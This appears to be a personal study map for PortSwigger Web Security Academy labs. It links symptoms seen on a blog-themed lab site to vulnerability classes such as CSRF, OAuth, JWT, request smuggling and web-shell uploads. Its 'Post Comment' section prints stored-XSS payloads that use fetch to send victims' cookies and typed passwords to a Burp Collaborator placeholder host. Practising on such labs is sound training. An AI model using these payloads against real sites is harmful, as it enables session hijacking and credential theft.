### Authenticated Blog
#### No Comments
##### GraphQL
- "mutation"
	- [[GraphQL Endpoints#2.4. Lab Bypassing GraphQL brute force protections ⭕️]]
	- [[GraphQL Endpoints#2.5. Lab Performing CSRF exploits over GraphQL ⭕️]]


#### Only Comment Field in Blog
##### Change Preferred Name
- `}}{{7*7}}` on `blog-post-author-display` param in `POST` request
	- Tornado
		- [[SSTI#3.2. Lab Basic server-side template injection (code context) ⭕️]]

##### Change Email + Upload Avatar + Delete account button
- [[Deserialization#3. Lab Using application functionality to exploit insecure deserialization ⭕️]]

#### Every field
##### My account
- "We are now redirecting you to login with social media..."
	- [[CSRF#2.10. Lab SameSite Lax bypass via cookie refresh ⭕️]]
	- No features (no change email, etc.)
		- `POST /authenticate`
			- [[OAuth Authentication#1/2.1. Lab Authentication bypass via OAuth implicit flow ⭕️]]
			- "Next post" button on blogs
				- [[OAuth Authentication#1/2.5. Lab Stealing OAuth access tokens via an open redirect ⭕️]]
		- *NO* `POST /authenticate`
			- [[OAuth Authentication#1/2.2. Lab SSRF via OpenID dynamic client registration ⭕️]]
			- [[OAuth Authentication#1/2.4. Lab OAuth account hijacking via redirect_uri ⭕️]]
- Login with social media button
	- Social media creds: `peter.wiener:hotdog`
		- [[CSRF#2.x. Lab Forced OAuth profile linking ⭕️]]


##### Forgot password?
- `Host` to `example.com`
	- 200 OK
		- [[Host Headers#1.1 Lab Basic password reset poisoning ⭕️]]
	- 421 Misdirected Request
		- [[Host Headers#1.11 Lab Password reset poisoning via middleware ⭕️]]
- `username` in `POST /forgot-password`
	- [[Password Reset#2.5. Lab Exploiting time-sensitive vulnerabilities ⭕️]]
	- `temp-forgot-password-token`
		- [[Password Reset#2.3. Lab Password reset broken logic ⭕️]]

##### Asks for 4-digit security code
- [[Authentication#1.2. Lab 2FA simple bypass ⭕️]]
- `verify` cookie 
	- [[Authentication#1.8. Lab 2FA broken logic ⭕️]]

##### Login Attempt: `wiener:peter`
- "Invalid username or password."
	- [[Authentication#1.7. Lab Username enumeration via account lock ⭕️]]
	- [[Brute Force#1.4. Lab Username enumeration via subtly different responses ⭕️]]
	- "HTML is allowed" in Blog + `x-host`
		- <sup>Param Miner: Guess headers</sup> [[Web Cache Poisoning#1.4.Lab Targeted web cache poisoning using an unknown header ⭕️]]
	- **Post Comment**
		- `<script> fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>` and victim's cookie in collaborator
			- [[Stored XSS#1.x. Lab Exploiting cross-site scripting to steal cookies ⭕️]]
		- `<input name=username id=username> <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">`
			- [[Stored XSS#1.x. Lab Exploiting cross-site scripting to capture passwords ⭕️]]
	- **Use HTTP Request Smuggling payload**
		- 500 Internal Server Error
			- [[CL.TE#1.3. Lab Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability ⭕️]]
			- [[Others#1.6. Lab Exploiting HTTP request smuggling to capture other users' requests ⭕️]]
- "Invalid username"
	- [[Brute Force#1.1 Lab Username enumeration via different responses ⭕️]]
- Admin panel or `/admin` = "Path /admin is blocked"
	- **Use HTTP Request Smuggling payload**
		- 400 Bad Request
			- [[Others#1.x. Lab CL.0 request smuggling ⭕️]]
			- [[TE.CL#1.4. Lab Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability ⭕️]]

##### Stay Logged In Checkbox
- [[Brute Force#1.9. Lab Brute-forcing a stay-logged-in cookie ⭕️]]
- No client-side validation for Email field
	- [[Business logic vulnerabilities#2.10. Lab Authentication bypass via encryption oracle ⭕️]]
- Delete account button
	- [[Brute Force#1.10. Lab Offline password cracking ⭕️]]

##### Change Email
- Invalid Login Attempts: `aaa:aaa`
	- "You have made too many incorrect login attempts. Please try again in X minute(s)."
		- [[Authentication#1.6. Lab Broken brute-force protection, IP block ⭕️]]
		- [[Brute Force#1.5. Lab Username enumeration via response timing ⭕️]]
		- [[Race conditions#1/2.2. Lab Bypassing rate limits via race conditions ⭕️]]
- `/my-account?id={GUID}`
	- [[Access Control#2.6. Lab User ID controlled by request parameter, with unpredictable user IDs ⭕️]]
- `POST /my-account/change-email`
	- No `csrf` token
		- [[CSRF#2.1. Lab CSRF vulnerability with no defenses ⭕️]]
		- [[CSRF#2.7. Lab SameSite Lax bypass via method override ⭕️]]
		- `SameSite=None`
			- [[CSRF#2.11. Lab CSRF where Referer validation depends on header being present ⭕️]]
			- [[CSRF#2.12. Lab CSRF with broken Referer validation ⭕️]]
		- `SameSite=Strict`
			- [[CSRF#2.8. Lab SameSite Strict bypass via client-side redirect ⭕️]]
	- Yes `csrf` token 
		- Content-Security-Policy
			- [[Reflected XSS#1.x. Lab Reflected XSS protected by very strict CSP, with dangling markup attack ⭕️]]
		- Remove `csrf` token
			- 302 Found
				- [[CSRF#2.2. Lab CSRF where token validation depends on request method ⭕️]]
				- [[CSRF#2.3. Lab CSRF where token validation depends on token being present ⭕️]]
			- 400 Bad Request: "Missing parameter 'csrf'"
				- [[CSRF#2.4. Lab CSRF where token is not tied to user session ⭕️]]
				- [[Stored XSS#1.x. Lab Exploiting XSS to bypass CSRF defenses ⭕️]]
				- [[Clickjacking#1/2.2. Lab Clickjacking with form input data prefilled from a URL parameter ⭕️]]
				- [[Clickjacking#1/2.3. Lab Clickjacking with a frame buster script ⭕️]]
- "Your API Key is: ..."
	- [[Web cache deception#1/2.1. Lab Exploiting path mapping for web cache deception ⭕️]]
	- `Server: Apache-Coyote/1.1`
		- [[Web cache deception#1/2.2. Lab Exploiting path delimiters for web cache deception ⭕️]]
	- Cache headers (`X-Cache`, `Age`, etc) only in `/resources`
		- Adding `.js` in `GET /my-account/aaa.js` doesn't reveal cache headers
			- [[Web cache deception#1/2.3. Lab Exploiting origin server normalization for web cache deception ⭕️]]
			- [[Web cache deception#1/2.4. Lab Exploiting cache server normalization for web cache deception ⭕️]]

##### Change Email + Delete Account
- `csrf` token
	- remove `csrf` token == 400 Bad Request
		- [[Clickjacking#1/2.1. Lab Basic clickjacking with CSRF token protection ⭕️]]
		- [[Clickjacking#1/2.5. Lab Multistep clickjacking ⭕️]]


##### Change Password + Change Email
- Remove `current-password`
	- 200 OK
		- [[Password Reset#2.7. Lab Weak isolation on dual-use endpoint ⭕️]]
	- 400 Bad Request: "Missing parameter"
		- [[Password Reset#1.12. Lab Password brute-force via password change ⭕️]]


#### Every field + File Upload in Blog
##### My account > File Upload
- After uploading `.php` file
	- `GET /.../{FILE}.php`
		- 200 OK
			- [[File Uploads#3.1. Lab Remote code execution via web shell upload ⭕️]]
			- [[File Uploads#3.3. Lab Web shell upload via path traversal ⭕️]]
		- "Sorry, file type text/php is not allowed Only image/jpeg and image/png are allowed..."
			- [[File Uploads#3.2. Lab Web shell upload via Content-Type restriction bypass ⭕️]]
	- `POST /my-account/avatar`
		- "Sorry, php files are not allowed"
			- [[File Uploads#3.4. Lab Web shell upload via extension blacklist bypass ⭕️]]
		- "Sorry, only JPY & PNG files are allowed"
			- [[File Uploads#3.5. Lab Web shell upload via obfuscated file extension ⭕️]]
		- "Error: file is not a valid image"
			- [[File Uploads#3.6. Lab Remote code execution via polyglot web shell upload ⭕️]]

#### Search Bar
##### `/admin`
- "Admin interface only available if logged in as an administrator"
	- JWT
		- <sup>Scan result: YES</sup>[[JWT#2.1. Lab JWT authentication bypass via unverified signature ⭕️]]
		- <sup>Scan result: YES</sup> [[JWT#2.2. Lab JWT authentication bypass via flawed signature verification ⭕️]]
		- <sup>JWT is smaller</sup> [[JWT#2.3. Lab JWT authentication bypass via weak signing key ⭕️]]
		- <sup>Scan result: YES</sup> [[JWT#2.4. Lab JWT authentication bypass via jwk header injection ⭕️]]
		- <sup>Scan result: YES</sup> [[JWT#2.5. Lab JWT authentication bypass via jku header injection ⭕️]]
		- [[JWT#2.6. Lab JWT authentication bypass via kid header path traversal ⭕️]]

##### Change Email
- `POST /my-account/change-email`
	- No `csrf` token
		- -
	- Yes `csrf` token 
		- Remove `csrf` token
			- 400 Bad Request: 
				- "Invalid CSRF token"
					- [[CSRF#2.5. Lab CSRF where token is tied to non-session cookie ⭕️]]
				- "Missing parameter 'csrf'"
					- [[Essential skills#1/2.2. Lab Scanning non-standard data structures ⭕️]]
		- `csrf` cookie
			- [[CSRF#2.6. Lab CSRF where token is duplicated in cookie ⭕️]]

##### Submit Feedback
- `searchLoggerConfigurable.js`
	- `config.transport_url`
		- <sup>DOM Invader > Scan for gadgets: script.src(1)</sup> [[Client side#2.1. Lab Client-side prototype pollution via browser APIs ⭕️]]
- `searchLogger.js`
	- <sup>DOM Invader > Scan for gadgets: script.src(1)</sup> [[Client side#2.2. Lab DOM XSS via client-side prototype pollution ⭕️]]
- `searchLoggerFiltered.js`
	- <sup>DOM Invader > Scan for gadgets: script.src(1)</sup> [[Client side#2.4. Lab Client-side prototype pollution via flawed sanitization ⭕️]]
- `jquery_3-0-0.js`
	- <sup>DOM Invader > Scan for gadgets: eval(1)</sup> [[Client side#2.3. Lab DOM XSS via an alternative prototype pollution vector ⭕️]]


##### Use the HTTP Request Smuggling Payload
- 400 Bad Request -- "Both chunked encoding and content-length were specified"
	- Cannot login
		- [[HTTP2#1.8. Lab Response queue poisoning via H2.TE request smuggling ⭕️]]
		- [[HTTP2#1.11. Lab HTTP/2 request splitting via CRLF injection ⭕️]]
	- Can login
		- [[HTTP2#1.10. Lab HTTP/2 request smuggling via CRLF injection ⭕️]]
		
- 500 Internal Server Error -- "Server Error: Communication timed out"
	- Can login
		- [[Others#1.5. Lab Exploiting HTTP request smuggling to reveal front-end request rewriting ⭕️]]


---